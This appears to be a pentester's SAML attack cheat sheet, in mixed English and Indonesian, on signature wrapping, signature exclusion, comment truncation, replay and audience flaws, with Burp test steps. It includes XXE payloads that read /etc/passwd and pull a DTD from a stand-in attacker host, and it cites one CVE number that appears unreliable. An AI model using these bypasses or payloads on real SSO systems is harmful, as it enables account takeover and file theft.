# saml--deep — auth

## Advanced XSW Variants (beyond classic XSW #1–#8)

The classic Somorovsky/Bauer variants include 8 patterns (signature remains on the original object, attacker inserts a fake assertion at a position processed differently by the parser). What is often missed in the field:

- **XSW at Response vs Assertion level**: signature is attached to `<Response>` but the application validates `<Assertion>` (or vice versa). The "Response signature wrapping" pattern allows replacing the assertion inside the signed Response without touching the signature bytes.
- **Namespace confusion**: two `<Assertion>` elements with different namespaces (`saml:` vs `samlp:` vs default) — validator selects one, business logic reads the other (parsing differential).
- **Duplicate ID**: two elements with the same `ID`; XML Signature reference resolves to the first (per spec), application takes the last (or vice versa via DOM vs SAX). This is the basis of XSW #7/#8 but often appears as a real product bug.
- **Extension/schema laxness**: inserting `<Extensions>` containing a second assertion; some parsers (e.g., those using `lxml` with `recover=True`) still process it.
- **Signature in `<Advice>`/`<Conditions>`**: some libraries only check for the presence of a signature in the subtree, not its required location.

Quick variant selection table based on target behavior:

| Target symptom | Variant to try |
|---|---|
| Accepts signed Response, reads Assertion | XSW Response-wrapping |
| "duplicate ID" error but still logs in in an edge case | Duplicate ID + node order |
| Passes if assertion is in `<Extensions>` | Extension injection |
| Lolos saat namespace diubah | Namespace confusion |
| Validation only checks signature presence | Signature exclusion |

## Signature Exclusion — Edge Case Modern

- **Unsigned Assertion in Signed Response**: many implementations only verify the signature on the Response, ignoring that the assertion inside it is unsigned. Test: remove `<Signature>` on the Assertion, keep it on the Response.
- **Signature with `Reference URI=""`** (enveloped whole-document) — some validators consider the entire document signed even though an attacker can add siblings outside the root that the application processes.
- **Weak `none` / `rsa-sha1` algorithm**: although the spec forbids it, some legacy libraries accept `http://www.w3.org/2000/09/xmldsig#rsa-sha1` or even do not validate `SignatureMethod` against an allowlist. Also check `DigestMethod` (`sha1` is still accepted in many enterprise IdPs).
- **KeyInfo injection**: replacing `<KeyInfo>` with an attacker-controlled `<X509Certificate>` when the SP does not pin the IdP cert. Variant: `RetrievalMethod` points to an external URL (SSRF + trust bypass).
- **Multiple `<Signature>`**: one valid (discarded), one invalid (used) — validator "first signature wins", application "last wins".

## Comment Truncation & Parser Differential

- **XML comment truncation** (CVE-2017-1164 etc.): validator truncates the value after `<!--` so `admin<!--x-->@evil.com` is seen as `admin` by one parser and `admin@evil.com` by another. Test NameID/audience/recipient with comment injection.
- **CDATA vs entity**: `admin@evil.com` vs `<![CDATA[admin]]>@evil.com` — normalization difference.
- **Whitespace & Unicode normalization**: `admin@evil.com` vs `admin@evil.com\u0000` vs NFKC (`admin@ｅvil.com`) — mismatch between IdP-side normalizer and SP-side comparator.
- **Billion laughs / quadratic blowup** in assertion (DoS) — not an auth bypass but often a finding; limit entity expansion in the report.

## XXE in Assertion — SAML Context

XXE in SAML is rare in the main Response (because of the signature), but appears in:
- **`<AttributeValue>` bertipe XML** (mis. `xsi:type="xs:anyType"`) — SP mem-parse attribute sebagai XML.
- **Metadata import**: SP imports attacker-supplied IdP metadata → XXE in the metadata parser (`/saml/metadata` import endpoint, SAML admin console).
- **SAML Artifact Resolution**: SOAP ArtifactResolve body is parsed without hardening.
- **LogoutRequest/LogoutResponse** (not always signed) — often a vector for XXE/SSRF.

Minimal payload in AttributeValue:

```xml
<saml:AttributeValue xsi:type="xs:anyType">
  <!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
  <r>&x;</r>
</saml:AttributeValue>
```

If the attribute output is rendered in the UI (user profile, admin panel) → exfil. For OOB:

```xml
<!ENTITY % p SYSTEM "http://attacker/oob.dtd"> %p;
```

## Audience / Recipient / Destination Mismatch

- **Empty or wildcard Audience**: `<AudienceRestriction>` absent, or `Audience` contains `*`/attacker URL. Test assertion from tenant A to SP tenant B (multi-tenant SP).
- **Recipient vs Destination**: `SubjectConfirmationData@Recipient` must equal the ACS URL. Many SPs only check `Destination` in the Response, not `Recipient` in SubjectConfirmation.
- **Missing `InResponseTo`** in SP-initiated flow → opens the opportunity for replay/IdP-initiated injection.
- **NotOnOrAfter/NotBefore**: wide clock skew (e.g., ±5 minutes) + replay window. Test assertion with `NotOnOrAfter` in the past + different `Recipient` path (`/acs` vs `/acs/`).
- **Multi-ACS SP**: one SP has multiple ACS (mobile/web). Assertion for ACS A is accepted at ACS B if the audience is the same.

Mismatch and impact table:

| Field | Impact if not validated |
|---|---|
| Audience | Cross-tenant / cross-SP token reuse |
| Recipient | Token for another endpoint is accepted |
| Destination | Same, at the Response level |
| InResponseTo | Replay & unsolicited injection |
| NotOnOrAfter | Replay jangka panjang |
| SubjectConfirmation Method | Bypass holder-of-key |

## Replay — Operational Variants

- **Weak cache key**: SP stores assertion ID in cache with TTL = `NotOnOrAfter` but key is only `AssertionID` without issuer → collisions between IdPs.
- **Race condition**: send 2 parallel requests with the same assertion; non-atomic cache check → two sessions are created.
- **Cross-protocol replay**: SAML Web SSO assertion is used at the SAML Artifact endpoint or in a different flow (SP-initiated vs IdP-initiated) whose cache is separate.
- **Stateless SP**: SP without any replay cache at all (many libraries default `validateReplay=false`). Confirm via two identical POSTs within <1 second.

## IdP-Initiated Abuse

- **Unsolicited Response accepted**: SP does not verify `InResponseTo` → an attacker with access to a legitimate IdP (or their own IdP if trust is configured loosely) can inject a session into the victim user (login CSRF / session fixation).
- **Trust based on Issuer string**: SP trusts `Issuer` without verifying the signature against that Issuer's cert (e.g., multi-IdP with misconfigured cert).
- **IdP-initiated + Deep link**: `RelayState` is passed to an open redirect → open redirect + token leak.
- **Cross-IdP confusion**: SP is registered with many IdPs; assertion from IdP A with `Issuer` of IdP B (if signature A is accepted due to a key resolution bug).

## Matriks Per Produk / Versi (pola umum)

| Product/Component | Common vulnerable patterns |
|---|---|
| old `python3-saml` (OneLogin) | Defaults not strict on some options (`wantAssertionsSigned` false) |
| `passport-saml` <2.x | Signature exclusion on Response vs Assertion |
| `ruby-saml` <1.12 | XSW & comment truncation (CVE-2020-…) |
| old Shibboleth SP | Loose Audience/Recipient in some configs |
| ADFS (versi lama) | IdP-initiated unsolicited + weak algorithm acceptance |
| Keycloak (default config) | `validateSignature` can be off on the client; wrong audience mapper |
| Spring Security SAML | Configuration of `requireSignedAssertions` vs `requireSignedResponse` |
| SimpleSAMLphp | `validate.authnrequest` / metadata trust longgar |
| Salesforce/Okta (SP side) | Multi-ACS & RelayState open redirect historis |

(Check specific CVEs per version before claiming; this table is patterns, not an advisory.)

## Tools — Advanced Usage (without repeating the basics)

**SAML Raider (Burp extension)**
- *SAML Message Editor* tab: automatic decode, edit then re-sign with a test cert.
- *Certificate* tab: import the target IdP cert (from public metadata) to forge a valid signature — crucial for testing signature exclusion vs wrapping.
- *Attack* menu: XSW klasik 1–8, signature stripping, signature faking (ganti cert), comment injection.
- Test flow: intercept POST `/SAML/SSO` → Raider → *Attack* → select variant → forward → observe response. Repeat per variant, note which produces a session.

**saml-tool (onelogin/python)**
- `saml-tool.py --decode` / `--encode` for assertions; `--logincache` to extract stored assertions.
- Generate a fake assertion: `--generate --nameid=admin@x --audience=... --issuer=...` then re-sign with a test cert.
- Useful for bulk scripting (loop XSW variants + replay).

**Supporting tools**: `xmlsec1` for manual verification (`xmlsec1 --verify`), `xmllint` to check well-formedness & ID, Burp *Repeater* + *Turbo Intruder* for replay races.

## Brief Burp Steps (not yet covered)

1. **Baseline**: send a valid assertion, note the session cookie that is created.
2. **Field enumeration**: change `Audience`, `Recipient`, `Destination`, `InResponseTo`, `NotOnOrAfter` one at a time; note which are ignored (still logged in).
3. **Signature exclusion**: remove `<Signature>` in the Assertion (keep it in the Response), then vice versa.
4. **XSW**: run Raider variants 1–8, forward, check whether a session is created and the identity (NameID) belongs to the attacker.
5. **Comment/encoding**: insert `<!-- -->` and CDATA in NameID/Audience; compare results.
6. **Replay**: resend the identical POST via Turbo Intruder (parallelism 2–5) to test the cache race.
7. **IdP-initiated**: remove `InResponseTo`, forward; if accepted → unsolicited.
8. **XXE**: inject in AttributeValue/metadata import, point to collaborator.
9. **Final validation**: ensure the bypassed session actually authenticates as the target (not just a redirect).

## Operational Pitfalls

- **Signature break due to whitespace**: editing via an editor that changes line endings/encoding breaks canonicalization — use the Raider editor or re-sign with a test cert.
- **Test cert vs target cert**: forging is only valid if the SP trusts the cert used; if pinning is strict, focus on XSW/signature exclusion, not signature faking.
- **Base64 URL-safe vs standard**: some SPs only accept a specific variant; normalize before decoding.
- **Deflate vs base64 murni**: `SAMLRequest`/`SAMLResponse` kadang ter-deflate (HTTP-Redirect binding); salah decode → payload rusak.
- **Clock skew**: test `NotOnOrAfter` with a margin; target server skew can make a variant "fail" when it's only timing.
- **Rate limit & lockout**: replay and variant brute-forcing can trigger test account lockout; use separate accounts and pauses.
- **Leaky logs**: many SPs log full assertions; check logs/idempotency before reporting (avoid overclaiming).
- **Multi-tenant**: test across tenants; audience bugs often only appear in certain tenant configurations.
- **Regression vs new bug**: note the product version; the same pattern may already be patched in the latest release — validate on the target version before claiming.

## Summary Table Impact → Test Priority

| Finding | Impact | Priority |
|---|---|---|
| Signature exclusion (Response only) | AUTH bypass penuh | Kritis |
| XSW (assertion swap) | AUTH bypass / impersonasi | Kritis |
| Audience/Recipient mismatch | Cross-tenant token reuse | Tinggi |
| Unsolicited IdP-initiated accepted | Login CSRF / fixation | High |
| Replay without cache | Repeated session takeover | High |
| Comment truncation | NameID validation bypass | Medium–High |
| XXE in AttributeValue/metadata | File read / SSRF / RCE chain | High |
| Weak algorithm (SHA1/`none`) | Forge signature (if key is weak) | Medium |
| Wide clock skew | Expands replay window | Low–Medium |

---

## [reasoning trace]


